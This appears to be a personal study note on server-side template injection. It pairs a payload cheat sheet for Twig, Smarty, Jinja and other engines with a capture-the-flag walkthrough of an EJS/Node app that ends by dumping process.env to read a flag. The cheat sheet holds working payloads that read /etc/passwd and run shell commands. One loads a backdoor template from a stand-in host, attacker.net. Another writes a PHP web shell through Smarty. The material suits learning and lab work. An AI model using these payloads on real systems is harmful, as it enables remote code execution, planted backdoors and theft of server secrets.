## **How to SSTI**
## Template Injection Methods
The code block will vary per template, for more info check the [SSTI blog below](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation)
## List Server Side Template Injection
```
### Generic
{{ }}
<%= %>
${{<%[%'"}}%\.
{% debug %}
{7*7}
{{ '7'*7 }}
{2*2}[[7*7]]
<%= 7 * 7 %>
#{3*3}
#{ 3 * 3 }
[[3*3]]
${2*2}
@(3*3)
${= 3*3}
{{= 7*7}}
${{7*7}}
#{7*7}
[=7*7]
{{ request }}
{{self}}
{{dump(app)}}
{{ [] .class.base.subclassesO }}
{{''.class.mro()[l] .subclassesO}}
for c in [1,2,3] %}{{ c,c,c }}{% endfor %}
{{ []._class.base.subclasses_O }}
{{['cat%20/etc/passwd']|filter('system')}}

### PHP 
{php}print "Hello"{/php}
{php}$s = file_get_contents('/etc/passwd',NULL, NULL, 0, 100); var_dump($s);{/php}
{{dump(app)}}
{{app.request.server.all|join(',')}}
"{{'/etc/passwd'|file_excerpt(1,30)}}"@
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{$smarty.version}
{php}echo id;{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}

### Python
{% debug %}
{{settings.SECRET_KEY}}
{% import foobar %} = Error
{% import os %}{{os.system('whoami')}}
```


![[Pasted image 20251231152756.png]]
Everytime we see input we submit to an application reflected back at the DOM we should think ==Can I get a XSS here?==

## Check for XSS Injection
We manage to get a XSS on the website, but there isn't much functionality on the app, and no session cookies to play around, so this XSS is considered a 'Self XSS' because there isn't much of an impact if we sent this to another user. 
**Payload**
```html
<s>Goku</s>
```
![[Pasted image 20251231153936.png]]
## Check for Command Injection
This is a common check for EJS Template, we want to check if the website will reflect the result on the page, so in this case giving us the value 9 will confirm it is.
From this we can confirm its confirming the arythmathic
**Payload**
```html
<%= 3 * 3 %>
```
![[Pasted image 20251231153438.png]]
![[Pasted image 20251231154556.png]]
## Check Process Info
Next let's check if we can access the global object
Using the Extension [Warpalyzer]() we know that the website is running Node.JS, so we can explore some documentations regarding the process.

Turns out Node.JS process has a property that lets you read the env variables **process.env** [Doc ref link](https://nodejs.org/api/process.html#processenv)
To read process env using the Template Injection method we have tried we run:
```html
<%= process.env %>
```
However, it will return a group of objects, so to read the keys we have to run:
```html
<%= Object.keys(process.env)%>
```
![[Pasted image 20251231155421.png]]

this will contai a list of all the .env keys on the server, if we scroll down we will find one name "FLAG"
Next we sent a final Template Injection to retrieve the flag
```html
<%= process.env.FLAG %>

```



